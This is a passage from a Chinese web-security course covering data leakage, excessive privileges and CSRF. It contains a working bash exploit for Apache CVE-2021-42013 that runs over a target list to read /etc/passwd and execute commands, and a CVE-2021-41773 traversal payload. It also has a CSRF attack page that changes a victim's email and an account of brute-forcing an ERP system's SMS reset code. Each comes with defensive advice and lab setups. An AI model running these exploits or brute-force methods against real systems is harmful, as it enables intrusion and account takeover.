如下代码通过使用一个Debug标识符来进行程序执行逻辑决策：</p>

<pre><code class="language-java hljs">&lt;% <span class="hljs-keyword">if</span> (Boolean.getBoolean(<span class="hljs-string">"debugEnabled"</span>)) { %&gt;
    User account number: &lt;% =account_num %&gt;
&lt;% } %&gt;
</code></pre>

<p>上述代码中，如果在部署应用过程中未将debugEnabled设置为False，敏感的调试会被输出到用户能够访问的页面。</p>

<p><strong>4. 权限获取问题</strong>-
如下代码为了给用户提供更符合用户需求的服务，希望通过获取坐标来判断用户的地理位置。</p>

<pre><code class="language-plain">&lt;uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/&gt;
</code></pre>

<p>在这种场景中，通过对getLastLocation()的调用，可以获得应用所需的坐标信息：</p>

<pre><code class="language-java hljs">locationClient = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LocationClient</span>(<span class="hljs-built_in">this</span>, <span class="hljs-built_in">this</span>, <span class="hljs-built_in">this</span>);
locationClient.connect();

Location userCurLocation;
userCurLocation = locationClient.getLastLocation();
...
</code></pre>

<p>事实上，为了满足应用的地理位置获取需求，ACCESS_FINE_LOCATION这个权限有些过高了，有时候我们只需要使用ACCESS_COARSE_LOCATION即可满足需求。当然这里我们只是举个例子，很多应用对于权限的滥用远不止于权限颗粒度，随着法律法规的健全，应用开发过程中我们对于权限的申请和使用需要越来越谨慎。</p>

<h2 id="案例实战">案例实战</h2>

<h4 id="2021某攻防演练行动中的某集团erp系统">2021某攻防演练行动中的某集团ERP系统</h4>

<p>该漏洞是一个由程序设计逻辑问题引发的敏感数据泄露漏洞，通过官网链接或者URL地址爆破，很容易找到密码找回功能界面，这里我们可以首先看一下该界面，提供了通过手机验证码来更新密码的功能：</p>

<p><img src="assets/f3c744c0e6e04699a33517c3b77e8ed4.jpg" alt="图片"></p>

<p>在尝试漏洞挖掘过程中，<strong>如果能够根据返回结果的差异性来判断函数内部的执行逻辑，对攻击者而言是非常有利的信号</strong>，因为这意味着黑盒的动态测试转变为白盒测试，大幅降低了攻击难度。</p>

<p>因此我们首先尝试不同的输入来探测应用系统返回结果：</p>

<p><img src="assets/5795040cb6fb442ab22d1457d65f2f0c.jpg" alt="图片"></p>

<p>可以看到返回的报错信息是足够清晰的，能够帮助我们判断每一次输入的正确性，这符合我们这节课分享的第一种典型风险场景。</p>

<p>接下来我们需要找到真实存在的用户账号以及对应手机号码，一种可行的途径是通过社会工程学获得，另一种方式是查找公开资源。</p>

<p>由于公开资源的查找比较方便快捷，这里先选择该思路进行尝试，通过一些简单的查询可以找到一份该系统的使用说明视频，视频中包含了用户登录过程，虽然登录过程的密码是以星号显示的，但是用户名可以确定，并且登录之后视频中展示的账号信息配置界面包含了手机号，至此我们已经找到真正存在的用户名及手机号码：</p>

<p><img src="assets/29f9b67ac9074337934d3ddbc88e52a2.jpg" alt="图片"></p>

<p>填入正确的用户名和手机号，点击获取手机验证码，功能一切正常。接下来我们只要猜测出手机验证码即可。按照一般应用系统的设计规则，验证码的范围应该主要有两种：</p>

<ul>
<li>0000-9999</li>
<li>000000-999999</li>
</ul>

<p>我们先随机输入一个格式正确的验证码，并且使用Burp进行请求拦截，可以截获该HTTP请求，随后使用Burp的请求重放功能，将验证码部分设置为payload，范围设置为0000-9999，开始爆破即可。</p>

<p><img src="assets/d85892e9516e4fdba244878a00616a26.jpg" alt="图片"></p>

<p>随着爆破结束，查看Burp的请求结果。结果中所有的请求结果长度都是一致的，说明并未找到正确的验证码。这里存在两种可能性，一种可能性是验证码为6位而非4位，另一种可能性是验证码已经过期。</p>

<p>这时我们只能逐一排查，将payload范围选择为000000-999999后重新启动重放攻击。大约3个小时后我们终于成功爆破出正确的验证码，本次攻击的访问控制绕过部分宣告成功。</p>

<p>虽然本次攻击过程仅仅尝试了6位验证码的攻击，但是需要知道的是一般验证码的有效期大概在10～30分钟，本次攻击的系统并不具备该限制，但是即使未来你检测的目标系统存在该限制，你仍然可以通过多线程并发爆破的方式在有限的时间内成功碰撞出正确的验证码。</p>

<p>那么截止到这里，我们已经在实战中成功验证了一个典型的风险模型场景，并且该风险场景包括业务敏感数据泄露以及程序逻辑设计不当两种安全风险。</p>

<h2 id="检测及防御方案">检测及防御方案</h2>

<p>由于数据泄露风险的特殊性质，主要是很多时候风险来源是逻辑层面、设计层面或者权限层面的安全问题，导致传统的防御方案和扫描器等很难发挥作用，也正因如此导致其成为了排名第一的风险种类，因此我们需要引入新型安全技术及工具来发现这类潜在风险。</p>

<p>在开发及设计阶段，可以考虑引入威胁建模及审计工具，来协助我们发现在逻辑层面以及设计层面引入的安全风险。通过对系统功能以及业务流程的威胁建模，可以帮助我们消除许多常见的安全隐患。</p>

<p>对于在开发中以及线上运营中的系统，我推荐你运用动态安全分析工具以及静态安全分析工具。以BAS（Breach &amp; Attack Simulation Platform，自动化模拟攻击）为首的动态安全分析工具能够更全面地覆盖系统功能及接口，同时发现深层次安全问题；而以SAST为首的静态安全分析工具则可以从代码脆弱性角度帮助我们发现并消除一些安全隐患。</p>

<h2 id="总结">总结</h2>

<p>敏感数据泄露即使在今天仍然是相当严重且普遍存在的一个风险点，主要原因是数据泄露并非一个纯粹的技术性问题，很多时候与业务流程、功能设计都息息相关。</p>

<p>单纯从漏洞危害程度来看，敏感数据泄露主要分为两种，一种是业务敏感数据泄露，另一种是技术敏感信息泄露。业务敏感数据的泄露危害性是巨大的，会直接影响到公司的品牌和业务运行；技术敏感信息泄露往往不能对应用系统安全性产生直接威胁，但配合其他漏洞的综合利用可以实现1+1&gt;2的效果，其他漏洞利用过程所需的重要信息也许就隐藏在泄露的技术敏感信息中。</p>

<p>这节课我们首先重点探讨了几种常见的非技术性敏感数据泄露场景：</p>

<ol>
<li>应用系统设计阶段逻辑问题；</li>
<li>异常处理输出不当；</li>
<li>应用部署时未关闭调试开关；</li>
<li>权限获取过多。</li>
</ol>

<p>接下来我们用一个2021年真实的护网行动案例，带你感受了现实场景的漏洞挖掘和利用。某世界500强集团的ERP系统，存在典型的应用系统设计阶段逻辑问题，通过输入和输出信息，攻击者可以判断出开发者的内部函数代码逻辑，进而不断探测出敏感数据，完成账户控制。</p>

<p>最后，针对敏感数据泄露的防御方案，我们列举了包括BAS、SAST、威胁建模在内的几种常见的有效防御方案。</p>

<h2 id="思考题">思考题</h2>

<p>通过本节课的探讨，你可以在实际场景中找到一个典型的潜在敏感数据泄露风险点吗？</p>

<p>欢迎在评论区留下你的思考，我们下节课再见。</p>
</div>
                        </div><div class="book-post">
                            
                            <div align="center">因收到Google相关通知，网站将会择期关闭。<a target="_blank" href="https://lumendatabase.org/notices/44265620">相关通知内容</a><hr></div>
                            
                            <p id="tip" align="center"></p>
                            <h1 id="title" data-id="04 权限不合理：攻击者进来就是root权限？" class="title">04 权限不合理：攻击者进来就是root权限？</h1>
                            <div><p>你好，我是王昊天。</p>

<p>在多年的电脑使用经历中，你肯定经历过这种画面：</p>

<p>下载了官方软件却没有正版授权，于是千辛万苦找到一个破解软件，但是在运行破解软件时不断被杀毒软件拦截，一怒之下你把杀毒软件关闭了，随着破解软件的成功消息弹出，你露出了满意的微笑……</p>

<p>3天后你的电脑由于病毒感染无法开机了。</p>

<p>这是一种很典型的场景——为了某些临时性的操作破坏了权限边界，进而导致安全问题的发生。其实，<strong>除了临时性的操作，还有很多权限安全问题是长期性的</strong>，可能是配置原因、也可能是代码原因，接下来就让我们来一起探究。</p>

<h2 id="权限不合理">权限不合理</h2>

<p><strong>权限不合理简单来说，是不合理的权限赋予、权限处理以及权限管理过程</strong>。这里所说的权限，指的是终端角色的一种属性。那么什么是终端角色呢？你可以理解为，用户就是一个终端角色。</p>

<p>与权限相关的赋予、处理以及管理过程，我们主要通过权限管理来统一实现。权限管理就是能够赋予终端执行某种特殊操作的权利，比如在某些运维场景下，运维人员能够获得系统维护的权限，这其中就包括重启服务器权限——我们都知道服务器重启可不是常规操作权限。</p>

<p><strong>接下来我们以运行时权限过高为例，来看几种典型的攻击场景。</strong></p>

<p>应用软件在执行某些操作时可能会获取过高的权限，这就可能会破坏我们之前课程中提到的最小权限原则，如果因为这种原因导致了提权漏洞的发生，就可能会放大其他安全风险，导致严重后果。</p>

<p>随着应用软件执行权限的提高，比如运行在root或者Administrator权限，操作系统或者软件环境提供的安全检查可能会失效；更进一步，由于操作环境权限提升，已经存在的中低危安全风险可能因此升级为高危安全漏洞。</p>

<p><strong>1. 高权限运行应用</strong></p>

<p>在安装和运行组件的过程中，某些程序组件的运行环境设置的权限过高，导致低权限应用通过服务调用关系可以完成提权操作。</p>

<p>与开发层面相比，这一类问题的发生更多倾向于运维层面，比较典型的场景如：攻击者通过WebApp挖掘出注入类型的漏洞，而数据库运行在root或者Administrator权限，则可以通过注入提权的方式尝试远程命令执行。</p>

<p><strong>2. 降权时出现异常</strong></p>

<p>以下代码尝试去创建一个用户文件夹，在此操作期间进行了短暂提权：</p>

<pre><code class="language-python hljs"><span class="hljs-keyword">def</span> <span class="hljs-title function_">makeNewUserDir</span>(<span class="hljs-params">username</span>):
    ...
    <span class="hljs-keyword">try</span>:
        raisePrivileges()
        os.mkdir(<span class="hljs-string">'/home/'</span> + username)
        lowerPrivileges()
    <span class="hljs-keyword">except</span> OSError:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
    ...
</code></pre>

<p>上述代码包含了一次短暂提权，开发者在完成目标操作后立即进行了降权，但要注意的是username作为一个外部输入的参数，可能由于各种原因（输入不合法、安全过滤不严格等）导致mkdir函数报错进而抛出异常，一旦触发这种情况lowerPrivileges函数就无法得到执行，程序将持续以高权限状态运行，可能会为后续漏洞利用过程提供舒适的环境。</p>

<h2 id="案例实战">案例实战</h2>

<h4 id="cve-2021-42013-简介">CVE-2021-42013 简介</h4>

<p>这是一个Apache服务器中存在的高危安全漏洞，会导致服务器路径遍历、关键文件泄露以及远程命令执行漏洞。</p>

<p>有趣的是，该漏洞是CVE-2021-41773的兄弟漏洞，CVE-2021-41773影响的软件版本是2.4.49，该软件版本在2021-09-15发布，在修复了CVE-2021-41773漏洞后，开发团队于2021-10-04发布了2.4.50版本，但是在新版本发布的次日，安全研究人员就发现对CVE-2021-41773漏洞的修复并不完善，会导致一个变种漏洞的发生——CVE-2021-42013。经过apache确认问题后，再次发布了2.4.51版本。</p>

<p>关于apache服务器历史源码的下载，可以在apache官网找到链接：<a href="https://archive.apache.org/dist/httpd/" target="_blank">Index of /dist/httpd</a></p>

<h4 id="cve-2021-42013-漏洞复现">CVE-2021-42013 漏洞复现</h4>

<p>这里我们提供了两种实验方案：你可以从源码编译安装，也可以直接使用MiTuan搭建好的环境。</p>

<p><strong>我们先来看看第一种方案，如何通过源码编译安装httpd。</strong></p>

<p>我们首先访问apache官网，选择2.4.50版本下载：</p>

<p><a href="https://archive.apache.org/dist/httpd/httpd-2.4.50.tar.gz" target="_blank">https://archive.apache.org/dist/httpd/httpd-2.4.50.tar.gz</a></p>

<p>通过Docker或者虚拟机启动一台Ubuntu Server，如下是httpd编译安装前的环境依赖：</p>

<pre><code class="language-bash hljs">apt install libapr1 libapr1-dev
apt install libaprutil1 libaprutil1-dev
apt install libpcre3 libpcre3-dev
</code></pre>

<p>然后编译安装即可：</p>

<pre><code class="language-bash hljs"><span class="hljs-comment"># Extract</span>
tar -xvf httpd-2.4.50.tar.gz
<span class="hljs-built_in">cd</span> httpd-2.4.50
<span class="hljs-comment"># Configure</span>
./configure
<span class="hljs-comment"># Compile</span>
make
<span class="hljs-comment"># Install</span>
make install
<span class="hljs-comment"># Test</span>
/usr/local/apache/bin/apachectl -k start
</code></pre>

<p>这里要注意在完全默认配置下该漏洞是不存在的，这里我们需要对配置文件做简单的修改：</p>

<pre><code class="language-plain"># 1.
&lt;Directory /&gt;
    Require all granted
&lt;/Directory&gt;
# 2.
LoadModule cgid_module modules/mod_cgid.so
</code></pre>

<p>上述的代码主要做了两处修改。一是许可了Apache服务器对文件系统的访问操作，二是加载了一个Module。</p>

<p>要知道，在部署WebApp的过程中这两处修改是非常普遍的，因此该漏洞的影响范围非常大。</p>

<p>通过netstat -antp命令可以查看服务状态：</p>

<pre><code class="language-bash hljs">root@1dd54d1b3962:/home<span class="hljs-comment"># netstat -antp</span>
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      26722/httpd
</code></pre>

<p><strong>我们来来看看第二种方案，尝试使用MiTuan直接启动环境。</strong></p>

<p>我已经构建好了标准的2.4.50版本httpd服务器环境，你可以访问<a href="http://mituan.zone" target="_blank">MiTuan</a>，直接搜索[极客时间-漏洞挖掘与智能攻防实战]并选择[CVE-2021-42013]来进行测试。</p>

<p>PoC代码如下：</p>

<pre><code class="hljs language-perl"><span class="hljs-comment">#!/bin/bash</span>

<span class="hljs-keyword">if</span> [[ $1 == <span class="hljs-string">''</span> ]]; [[ $2 == <span class="hljs-string">''</span> ]]; then
  echo Set [TAGET-LIST.TXT] [PATH] [COMMAND]
  echo ./PoC.sh targets.txt /etc/passwd
  echo ./PoC.sh targets.txt /bin/sh id
  <span class="hljs-keyword">exit</span>
fi

<span class="hljs-keyword">for</span> host in $(cat $1);
<span class="hljs-keyword">do</span>
  echo $host
  <span class="hljs-keyword">if</span> [[ $3 == <span class="hljs-string">''</span> ]]; then
    curl -v --path-as-is <span class="hljs-string">"$host/icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/$2"</span>;
    <span class="hljs-keyword">exit</span>
  fi
  curl -s --path-as-is -d <span class="hljs-string">"echo Content-Type: text/plain; echo; $3"</span> <span class="hljs-string">"$host/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/$2"</span>;
done
</code></pre>

<p>执行PoC代码：</p>

<pre><code class="language-bash hljs">root@1dd54d1b3962:/home<span class="hljs-comment"># ./CVE-2021-42013.sh targets.txt /etc/passwd</span>
127.0.0.1
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...

root@1dd54d1b3962:/home<span class="hljs-comment"># ./CVE-2021-42013.sh targets.txt /bin/sh id</span>
http://127.0.0.1
uid=1(daemon) gid=1(daemon) <span class="hljs-built_in">groups</span>=1(daemon)
</code></pre>

<p>可以看到我们可以通过该漏洞访问到<code>/etc/passwd</code>文件，并且执行命令获取当前环境的用户信息。</p>

<h4 id="cve-2021-41773-漏洞分析">CVE-2021-41773 漏洞分析</h4>

<p>在成功利用漏洞之后，接下来我们要探究一下漏洞的具体成因。考虑到CVE-2021-42013与CVE-2021-41773是兄弟漏洞，CVE-2021-42013是由于修复不完善导致的变形，所以这里我们从CVE-2021-41773分析入手。</p>

<p>CVE-2021-41773影响的是Apache HTTP Server 2.4.49版本，因此我们可以：从官网下载对应的源代码，使用常用的编辑器查看：<a href="https://archive.apache.org/dist/httpd/httpd-2.4.49.tar.gz" target="_blank">https://archive.apache.org/dist/httpd/httpd-2.4.49.tar.gz</a>，或者通过MiTuan的CVE-2021-42013漏洞环境查看。MiTuan的漏洞环境中的<code>/home/httpd-2.4.49</code>包含了对应的源码，同时也内置了vim编辑器。</p>

<p>与本漏洞相关的核心代码位于<code>/home/httpd-2.4.49/server/util.c</code>文件，核心函数是<code>ap_normalize_path(char *path, unsigned int flags)</code>，漏洞相关代码如下：</p>

<pre><code class="language-c++ hljs language-c">|    <span class="hljs-keyword">while</span> (path[l] != <span class="hljs-string">'\0'</span>) {
-        <span class="hljs-comment">/* RFC-3986 section 2.3:
2         *  For consistency, percent-encoded octets in the ranges of
2         *  ALPHA (%41-%5A and %61-%7A), DIGIT (%30-%39), hyphen (%2D),
2         *  period (%2E), underscore (%5F), or tilde (%7E) should [...]
2         *  be decoded to their corresponding unreserved characters by
2         *  URI normalizers.
2         */</span>
<span class="hljs-number">2</span>        <span class="hljs-comment">// 老师添加的注释 - part1</span>
<span class="hljs-number">2</span>        <span class="hljs-keyword">if</span> ((flags &amp; AP_NORMALIZE_DECODE_UNRESERVED)
-                &amp;&amp; path[l] == <span class="hljs-string">'%'</span> &amp;&amp; apr_isxdigit(path[l + <span class="hljs-number">1</span>])
-                                  &amp;&amp; apr_isxdigit(path[l + <span class="hljs-number">2</span>])) {
<span class="hljs-number">3</span>            <span class="hljs-type">const</span> <span class="hljs-type">char</span> c = x2c(&amp;path[l + <span class="hljs-number">1</span>]);
<span class="hljs-number">3</span>            <span class="hljs-keyword">if</span> (apr_isalnum(c) || (c &amp;&amp; <span class="hljs-built_in">strchr</span>(<span class="hljs-string">"-._~"</span>, c))) {
-                <span class="hljs-comment">/* Replace last char and fall through as the current
4                 * read position */</span>
<span class="hljs-number">4</span>                l += <span class="hljs-number">2</span>;
<span class="hljs-number">4</span>                path[l] = c;
<span class="hljs-number">3</span>            }
<span class="hljs-number">2</span>        }
-           ...
<span class="hljs-number">2</span>        <span class="hljs-keyword">if</span> (w == <span class="hljs-number">0</span> || IS_SLASH(path[w - <span class="hljs-number">1</span>])) {
-            <span class="hljs-comment">/* Collapse ///// sequences to / */</span>
<span class="hljs-number">3</span>            <span class="hljs-keyword">if</span> ((flags &amp; AP_NORMALIZE_MERGE_SLASHES) &amp;&amp; IS_SLASH(path[l])) {
-                <span class="hljs-keyword">do</span> {
-                    l++;
<span class="hljs-number">4</span>                } <span class="hljs-keyword">while</span> (IS_SLASH(path[l]));
<span class="hljs-number">4</span>                <span class="hljs-keyword">continue</span>;
<span class="hljs-number">3</span>            }
<span class="hljs-number">3</span>
<span class="hljs-number">3</span>            <span class="hljs-comment">// 老师添加的注释 - part2</span>
<span class="hljs-number">3</span>            <span class="hljs-keyword">if</span> (path[l] == <span class="hljs-string">'.'</span>) {
-                <span class="hljs-comment">/* Remove /./ segments */</span>
<span class="hljs-number">4</span>                <span class="hljs-keyword">if</span> (IS_SLASH_OR_NUL(path[l + <span class="hljs-number">1</span>])) {
-                    l++;
<span class="hljs-number">5</span>                    <span class="hljs-keyword">if</span> (path[l]) {
-                        l++;
<span class="hljs-number">5</span>                    }
<span class="hljs-number">5</span>                    <span class="hljs-keyword">continue</span>;
<span class="hljs-number">4</span>                }
<span class="hljs-number">4</span>                <span class="hljs-comment">/* Remove /xx/../ segments */</span>
<span class="hljs-number">4</span>                <span class="hljs-keyword">if</span> (path[l + <span class="hljs-number">1</span>] == <span class="hljs-string">'.'</span> &amp;&amp; IS_SLASH_OR_NUL(path[l + <span class="hljs-number">2</span>])) {
-                    <span class="hljs-comment">/* Wind w back to remove the previous segment */</span>
<span class="hljs-number">5</span>                    <span class="hljs-keyword">if</span> (w &gt; <span class="hljs-number">1</span>) {
-                        <span class="hljs-keyword">do</span> {
-                            w--;
<span class="hljs-number">6</span>                        } <span class="hljs-keyword">while</span> (w &amp;&amp; !IS_SLASH(path[w - <span class="hljs-number">1</span>]));
<span class="hljs-number">5</span>                    }
</code></pre>

<p>根据我在源码中添加的注释，可以定位关键代码段：</p>

<ul>
<li><p>注释1：-
检测到路径中存在%字符时，如果紧跟的2个字符是十六进制字符，就会进行url解码，将其转换成标准字符。</p>

<p>效果：<code>%2e -&gt; .</code></p></li>

<li><p>注释2：-
判断是否存在<code>../</code> ，如果路径中存在<code>%2e./</code> 形式，就会检测到，但是出现<code>.%2e/</code> 这种形式时，就不会检测到。</p>

<p>效果：使用<code>.%2e/</code>或者<code>%2e %2e</code> 绕过对路径穿越符的检测。</p></li>
</ul>

<p>由此，即可构建PoC代码：</p>

<pre><code class="hljs language-perl"> $host/cgi-bin/.%2e/%<span class="hljs-number">2</span>e%2e/%<span class="hljs-number">2</span>e%2e/%<span class="hljs-number">2</span>e%2e/%<span class="hljs-number">2</span>e%2e/%<span class="hljs-number">2</span>e%2e/%<span class="hljs-number">2</span>e%2e/%<span class="hljs-number">2</span>e%2e/%<span class="hljs-number">2</span>e%2e/%<span class="hljs-number">2</span>e%2e/etc/password
</code></pre>

<p>好的，至此我们已经成功从代码中分析清楚CVE-2021-41773漏洞的成因，并且构建了能够利用漏洞的PoC代码。接下来我们要学习如何从安全建设和开发的角度来防御这种风险。</p>

<h2 id="防御及检测">防御及检测</h2>

<p>针对权限相关的安全问题，在三个不同的阶段，我们分别有不同的方式加以防御和检测。</p>

<p><strong>在架构设计阶段</strong>，你可以使用“最小权限原则”来运行你的代码，如果可能的话，为你的任务代码创建一个独立的、拥有受限权限的账户。在这种情况下，即使攻击者的完成了一次入侵，也很难直接威慑到软件系统的其他部分。举例来说，数据库应用很少以DBA的形式长时间运行。</p>

<p>另外，你需要识别出需要额外权限的函数，并做好“权限隔离”。**可以通过封装的方式，尽可能的将高权限需求函数与其他代码分割开，同时尽量晚地进行提权操作，以及尽量早地进行降权操作，防止外部任何可能干扰高权限代码段的输入发生。</p>

<p><strong>在开发实现阶段</strong>，你需要对于高权限代码段要给予足够的关注，在输入检测层面要提供更严格的审核以及限制策略。</p>

<p>当进行降权时，不要忘记额外调用检测函数以确保权限被成功降低，防止出现降权函数执行失败导致权限没有降低的情况。</p>

<p><strong>在系统配置阶段</strong>，对于复杂应用系统，你要确保配置文件得到良好的审计，配置文件往往会大幅度影响应用系统的权限级别。</p>

<h2 id="总结">总结</h2>

<p>这节课我们学习了一种很常见但是很重要的安全风险——权限相关的漏洞。</p>

<p>这种漏洞有时与运维相关，由高权限运行应用导致；有时与开发代码相关，由开发时降权失败导致，对此我们分别列举了典型的攻击场景。</p>

<p>然后我们找到了一个2021年发生高危漏洞——CVE-2021-42013，它是一个由于配置不当引发的权限相关的漏洞，成功利用可以导致文件越权访问以及远程代码执行。</p>

<p>通过搭建环境并进行PoC代码编写，我们成功完成了漏洞的复现，掌握了CVE-2021-42013的使用。</p>

<p>但是会使用一个漏洞只是量的积累，我们更希望以点及面，从这个漏洞入手进而掌握这一类漏洞的原理。为了分析漏洞原理，我们追踪了它的兄弟漏洞——CVE-2021-41773，这是CVE-2021-42013漏洞的前一版本，正是由于开发人员更新时针对CVE-2021-41773的修复不完整，才导致了CVE-2021-42013的发生。</p>

<p>接下来我们又从源码层面挖掘漏洞的根源。</p>

<p>你需要判断是否存在<code>../</code>，如果路径中存在<code>%2e./</code>形式，就会检测到，但是出现<code>.%2e/</code>这种形式时 ，就不会检测到。这一漏洞是由于输入检测不严格，导致用户能够进行输入绕过，完成命令执行。</p>

<p>从本质上来看，问题发生的根源是过滤不严格导致的安全漏洞，关于输入过滤的问题我们已经在前几节课中探讨过，这节课我们更多的是关注存在问题时，我们应该如何做安全建设：</p>

<ol>
<li>通过函数封装、用户隔离等方式最小权限运行代码；</li>
<li>对高权限代码给予额外的输入检测以及函数检查；</li>
<li>对复杂应用系统的配置文件进行安全审计。</li>
</ol>

<p>通过结合前几节课程中提到的输入过滤等安全策略，这种多维度、多层次的安全建设，可以更有效地提高应用系统的整体安全性。</p>

<h2 id="思考题">思考题</h2>

<p>这节课我们研究了CVE-2021-41773 漏洞，你可以继续完成CVE-2021-42013 漏洞的分析吗？</p>

<p>欢迎在评论区留下你的思考，我们下节课再见。</p>
</div>
                        </div><div class="book-post">
                            
                            <div align="center">因收到Google相关通知，网站将会择期关闭。<a target="_blank" href="https://lumendatabase.org/notices/44265620">相关通知内容</a><hr></div>
                            
                            <p id="tip" align="center"></p>
                            <h1 id="title" data-id="05 CSRF：为什么用户的操作他自己不承认？" class="title">05 CSRF：为什么用户的操作他自己不承认？</h1>
                            <div><p>你好，我是王昊天。</p>

<p>想象你是个青春阳光的精神小伙，和女神小美青梅竹马，培养了十几年的感情。眼看着就要抱得美人归时，半路杀出了个男二号，成了你的竞争对手。有一天你们恰好在一起聚会，男二号趁你上厕所，用你的手机给小美发了微信。</p>

<p>“小美，你闺蜜真好看，可以介绍给我吗？”</p>

<p>你回来时，小美大骂了你一通，然后生气地摔门而去。</p>

<p>在这个故事里，男二就通过他的行为完成了一次CSRF。</p>

<h2 id="csrf">CSRF</h2>

<p>CSRF的全名是Cross-Site Request Forgery，中文名称是跨站点请求伪造，简单来说，<strong>就是让Web应用程序不能有效地分辨一个外部的请求，是否真正来自发起请求的用户</strong>，虽然这个请求可能是构造完整、并且输入合法的。</p>

<p>和前几节课程中学习过的漏洞相比，CSRF有自己的漏洞名称，明显是一个更为细分的漏洞类型，而非一个漏洞类别。它作为一个独立的细分漏洞类型，值得我们单独进行探讨，说明影响力是足够大的。</p>

<p>扩展开讲一讲，当一个Web应用在设计过程中没有充分考虑来自客户端请求的验证机制时，就可能会遇到CSRF问题。站在攻击者的视角来看，他可以通过一个URL、图片加载或者XMLHttpRequest等方式，让用户触发一个自动化请求发送行为，这个请求在Web Server接受时会被认为是合法的。</p>

<p><strong>接下来我们看一个典型的攻击场景。</strong></p>

<p>如下HTML目的是让用户更新自己的信息：</p>

<pre><code class="language-plain">&lt;form action = "/url/profile.php" method = "post"&gt;
    &lt;input type = "text" name = "firstname" /&gt;
    &lt;input type = "text" name = "lastname" /&gt;
    &lt;br/&gt;
    &lt;input type = "text" name = "email" /&gt;
    &lt;input type = "submit" name = "submit" value = "Update" /&gt;
&lt;/form&gt;
</code></pre>

<p>其中的profile.php包含如下代码：</p>

<pre><code class="language-php hljs"><span class="hljs-comment">// initial the seesion in order to validate sessions</span>
<span class="hljs-title function_ invoke__">session_start</span>();
<span class="hljs-comment">// if the session is registered a valid user the allow update</span>
<span class="hljs-keyword">if</span> ( !<span class="hljs-title function_ invoke__">session_is_registered</span>(<span class="hljs-string">"username"</span>) )
{
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"invalid session detected!"</span>;
    <span class="hljs-comment">// Redirect user to login page</span>
    ...
    <span class="hljs-keyword">exit</span>;
}
<span class="hljs-comment">// The user session is valid, so process the request</span>
<span class="hljs-comment">// and update the information</span>
<span class="hljs-title function_ invoke__">update_profile</span>();
</code></pre>

<p>这里的PHP代码中是包含了一些保护措施的，结合我们前面几节课程学到的内容来看，它包含了用户身份的有效性认证，阻止了越权访问。<strong>但是上述代码并不能够有效地防止CSRF攻击，</strong>如果攻击者可以构建下面这段代码，并且将它托管到某个站点，那么当用户保持登录状态并且访问攻击代码页面时，就会触发攻击代码：</p>

<pre><code class="language-javascript hljs">&lt;script&gt;
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params"></span>)
    {
        form.<span class="hljs-property">email</span> = <span class="hljs-string">"attacker@example.com"</span>
        form.<span class="hljs-title function_">submit</span>();
    }
&lt;script&gt;

<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span> = <span class="hljs-string">"attack()"</span>&gt;</span>
    // ...
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span>
</code></pre>

<p>可以看到，上述攻击代码包含了用户在使用浏览器时不可见的内容，当攻击代码在浏览器中加载时，会触发attack函数。如果用户在访问受害网站时保持的登录状态，受害网站就会收到来自用户的请求，请求内容是将E-mail更新为攻击者的邮件地址。这样在后续的攻击操作中，例如邮件验证码等操作都会发送到攻击者邮箱。</p>

<p>通过上述典型的攻击代码，<strong>我们可以总结出几点CSRF攻击特征</strong>：</p>

<ul>
<li>攻击一般发生在跨域场景下，主要原因是外域相较于被攻击目标通常安全级别更低，攻击者更容易控制；</li>
<li>CSRF在攻击过程中事实上并没有获取到用户的登录凭据，只是借用户之手发送了恶意的请求；</li>
<li>攻击者可以采用的方式有很多：图片URL、超链接、表单提交等许多方式。</li>
</ul>

<h2 id="案例实战">案例实战</h2>

<h4 id="cve-2021-31760">CVE-2021-31760</h4>

<p>我为你准备了一份新鲜又甜美可口的漏洞，来实际体验CSRF漏洞挖掘过程以及实际利用效果，那么不卖关子了，直接上漏洞编号——CVE-2021-31760。</p>

<p>首先介绍一下Webmin，Webmin是一个基于Web的系统配置工具，它是一款开源工具，主要由杰米·卡梅隆（Jamie Cameron）和Webmin社区进行共同维护。Webmin允许用户配置操作系统内部信息，例如用户、磁盘配额、服务或配置文件，以及修改和控制开源应用，例如Apache http服务器或MySQL等。CVE-2021-31760主要影响Webmin 1.973版本，通过CSRF漏洞的利用可以实现远程命令执行（RCE）的效果。</p>

<p>该漏洞环境已经在谜团<a href="https://mituan.zone/#/" target="_blank">MiTuan</a>上构建完成，你可以直接访问谜团搜索CVE-2021-31760进行复现。</p>

<h4 id="漏洞挖掘过程">漏洞挖掘过程</h4>

<p>接下来我们进入漏洞挖掘过程，来看该漏洞是如何被发现的。</p>

<p>首先从官方的GitHub仓库下载1.973版本的源代码，官方仓库地址是<a href="https://github.com/webmin/webmin" target="_blank">GitHub - webmin/webmin: Powerful and flexible web-based server management control panel</a>。然后进入如下目录，选择run.cgi文件打开：</p>

<pre><code class="language-bash hljs">hunter@HunterdeiMac  ~/Downloads/webmin/proc  vim run.cgi
</code></pre>

<p>通过查看程序代码主体可以发现代码中并没有关于访问来源的审计：</p>

<pre><code class="language-bash hljs">...
<span class="hljs-variable">$in</span>{<span class="hljs-string">'input'</span>} =~ s/\r//g;
<span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$in</span>{<span class="hljs-string">'cmd'</span>};
<span class="hljs-keyword">if</span> (&amp;supports_users()) {
    defined(getpwnam(<span class="hljs-variable">$in</span>{<span class="hljs-string">'user'</span>})) || &amp;error(<span class="hljs-variable">$text</span>{<span class="hljs-string">'run_euser'</span>});
    &amp;can_edit_process(<span class="hljs-variable">$in</span>{<span class="hljs-string">'user'</span>}) || &amp;error(<span class="hljs-variable">$text</span>{<span class="hljs-string">'run_euser2'</span>});
